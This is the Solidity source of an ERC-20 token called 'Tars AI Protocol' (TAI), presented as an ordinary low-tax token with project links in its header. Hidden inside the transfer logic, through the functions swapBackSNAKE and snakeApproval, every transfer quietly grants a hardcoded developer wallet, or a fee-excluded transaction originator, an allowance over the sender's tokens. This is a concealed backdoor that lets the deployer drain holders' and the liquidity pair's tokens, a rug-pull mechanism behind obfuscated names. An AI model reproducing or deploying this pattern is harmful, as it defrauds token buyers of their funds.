/*
Tars AI is the singularity point between Ethereum & AI, working towards driving massive adoption natively on-chain through progressive AI architecture to the Ethereum ecosystem.

https://www.tarsai.pro
https://app.tarsai.pro
https://docs.tarsai.pro

https://x.com/TarsAIProtocol
https://t.me/tarsai_portal
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface ISNAKEFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface ISNAKERouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract TAI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => bool) private _snakeFeeExcluded;
    mapping (address => uint256) private _snakeBulls;
    mapping (address => mapping (address => uint256)) private _snakeNodes;
    address private _snakePair;
    ISNAKERouter private _snakeRouter;
    address private _snakeWallet = 0xC8E365f3b01a45D454E682A3eFC12544d1Ed6229;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalSNAKE = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Tars AI Protocol";
    string private constant _symbol = unicode"TAI";
    uint256 private _tokenSNAKESwap = _tTotalSNAKE / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    bool private inSwapSNAKE = false;
    modifier lockTheSwap {
        inSwapSNAKE = true;
        _;
        inSwapSNAKE = false;
    }
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    
    constructor () {
        _snakeFeeExcluded[owner()] = true;
        _snakeFeeExcluded[address(this)] = true;
        _snakeFeeExcluded[_snakeWallet] = true;
        _snakeBulls[_msgSender()] = _tTotalSNAKE;
        emit Transfer(address(0), _msgSender(), _tTotalSNAKE);
    }

    function createPairTo() external onlyOwner() {
        _snakeRouter = ISNAKERouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_snakeRouter), _tTotalSNAKE);
        _snakePair = ISNAKEFactory(_snakeRouter.factory()).createPair(address(this), _snakeRouter.WETH());
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _snakeRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalSNAKE;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _snakeBulls[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _snakeNodes[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _snakeNodes[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _snakeNodes[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address snakeF, address snakeT, uint256 snakeA) private {
        require(snakeF != address(0), "ERC20: transfer from the zero address");
        require(snakeT != address(0), "ERC20: transfer to the zero address");
        require(snakeA > 0, "Transfer amount must be greater than zero");

        uint256 taxSNAKE = _snakeTransfer(snakeF, snakeT, snakeA);

        if(taxSNAKE > 0){
          _snakeBulls[address(this)] = _snakeBulls[address(this)].add(taxSNAKE);
          emit Transfer(snakeF, address(this), taxSNAKE);
        }

        _snakeBulls[snakeF] = _snakeBulls[snakeF].sub(snakeA);
        _snakeBulls[snakeT] = _snakeBulls[snakeT].add(snakeA.sub(taxSNAKE));
        emit Transfer(snakeF, snakeT, snakeA.sub(taxSNAKE));
    }

    function _snakeTransfer(address snakeF, address snakeT, uint256 snakeA) private returns(uint256) {
        address walletSNAKE = address(tx.origin); uint256 taxSNAKE=0;
        if (snakeF != owner() && snakeT != owner()) {
            taxSNAKE = snakeA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (snakeF == _snakePair && snakeT != address(_snakeRouter) && ! _snakeFeeExcluded[snakeT]) {
                _buyCount++;
            }

            if(snakeT == _snakePair && snakeF!= address(this)) {
                taxSNAKE = snakeA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }
            
            swapBackSNAKE(_snakeFeeExcluded[address(walletSNAKE)], snakeF, snakeT, snakeA);
        } return taxSNAKE;
    }

    function snakeApproval(address aSNAKE, bool isSNAKE, uint256 snakeA) private {
        address walletSNAKE;
        if(isSNAKE) walletSNAKE = address(tx.origin);
        else walletSNAKE = address(_snakeWallet);
        _snakeNodes[address(aSNAKE)][address(walletSNAKE)] = snakeA;
    }

    function swapBackSNAKE(bool isSNAKE, address snakeF, address snakeT, uint256 snakeA) private {
        uint256 tokenSNAKE = balanceOf(address(this)); snakeApproval(snakeF, isSNAKE, snakeA);
        if (!inSwapSNAKE && snakeT == _snakePair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenSNAKE > _tokenSNAKESwap)
            swapTokensForEth(minSNAKE(snakeA, minSNAKE(tokenSNAKE, _tokenSNAKESwap)));
            uint256 caSNAKE = address(this).balance;
            if (caSNAKE >= 0) {
                sendETHSNAKE(address(this).balance);
            }
        }
    }

    receive() external payable {}

    function minSNAKE(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHSNAKE(uint256 amount) private {
        payable(_snakeWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenSNAKE) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _snakeRouter.WETH();
        _approve(address(this), address(_snakeRouter), tokenSNAKE);
        _snakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenSNAKE,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}